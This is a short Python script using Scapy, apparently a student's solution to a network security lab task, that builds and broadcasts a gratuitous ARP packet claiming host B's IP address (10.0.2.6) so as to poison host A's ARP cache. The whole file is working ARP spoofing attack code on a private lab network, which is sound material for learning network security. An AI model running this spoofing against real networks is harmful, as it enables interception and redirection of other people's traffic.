#!/usr/bin/python3

from scapy.all import *

#Task 1C: Using ARP gratuitous message to send to host A

#Under Ether():
# M broadcasts ARP request to all containing A's IP address
#dst (dest MAC): "ff:ff:ff:ff:ff:ff" (broadcast MAC address)

E = Ether(dst = "ff:ff:ff:ff:ff:ff")

#Under ARP():
#psrc (source IP): B's IP [10.0.2.6]
#pdst (dest IP): B's IP [10.0.2.6]
#hwdst (dest MAC): "ff:ff:ff:ff:ff:ff" (broadcast MAC address)

A = ARP(psrc = "10.0.2.6", pdst = "10.0.2.6", hwdst = "ff:ff:ff:ff:ff:ff")

pkt = E/A 
sendp(pkt)
